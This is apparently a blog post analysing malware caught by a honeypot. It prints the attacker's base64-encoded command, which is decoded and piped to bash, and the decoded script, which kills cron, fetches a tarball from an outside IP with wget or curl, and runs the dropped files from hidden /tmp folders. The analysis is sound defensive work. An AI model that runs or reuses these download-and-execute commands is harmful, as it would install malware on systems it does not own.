### What the cat brought home

I was looking at my honey pot this morning and I saw a what looked like base64 strings. A lot of time attackers like base64 because it makes it easy for them to bypass detection or even becuase it can ensure that
the string is still the same when ran. The attacker used the login, root/jinsheng to gain access to the honey pot. The Ip address used was: ```54.37.136.183```
In figure 1, we can see the actually command that the attacker used. 
```ruby 
cd /var/tmp; echo \"IyEvYmluL2Jhc2gKY2QgL3RtcApybSAtcmYgLlgxNS11bml4Cm1rZGlyIC5YMTUtdW5peApjZCAuWDE1LXVuaXgKcGtpbGwgLTkgY3JvbiA+IC5vdXQKd2dldCAtcSBodHRwOi8vNTQuMzcuNzAuMjQ5L2RvdGEyLnRhci5neiB8fCBjdXJsIC1PIC1mIGh0dHA6Ly81NC4zNy43MC4yNDkvZG90YTIudGFyLmd6CnNsZWVwIDdzICYmIHRhciB4ZiBkb3RhMi50YXIuZ3oKI3JtIC1yZiBkb3RhMi50YXIuZ3oKY2QgLnJzeW5jCmNobW9kIDc3NyAqCmNkIC90bXAvLlgxNS11bml4Ly5yc3luYy9hICYmIC4vY3JvbiB8fCAuL2FuYWNyb24KZXhpdCAw\">.threatstackcloudsecops; base64 --decode .threatstackcloudsecops | bash
```
Figure 1: the command used to download the malware.
As seen in Figure 1, the attacker first changed the directory to ```/var/tmp````. After changing the directory the base64 encoded string is decoded and than run. In Figure 2, we can see the
decoded base64 string.

```ruby
#!/bin/bash
cd /tmp
rm -rf .X15-unix
mkdir .X15-unix
cd .X15-unix
pkill -9 cron > .out
wget -q http://54.37.70.249/dota2.tar.gz || curl -O -f http://54.37.70.249/dota2.tar.gz
sleep 7s && tar xf dota2.tar.gz
#rm -rf dota2.tar.gz
cd .rsync
chmod 777 *
cd /tmp/.X15-unix/.rsync/a && ./cron || ./anacron
exit 0
```
Figure 2: the decoded base64 string
As seen in figure 2, the base64 removes the directory ```.X15-unix``` and then creates a new directory named the same thing.
After it creates a new directory the script changes to the newly created directory and also kills the cron process.
Next the the attacker downloads a .tar.gz file from ```http://54.37.70.249/dota2.tar.gz```. 
The script will than change directories to the .rsync and give the all the files in the dirctories permissions, after that it will run the
files ```a``` and ```cron```.


### A Look into the files dropped
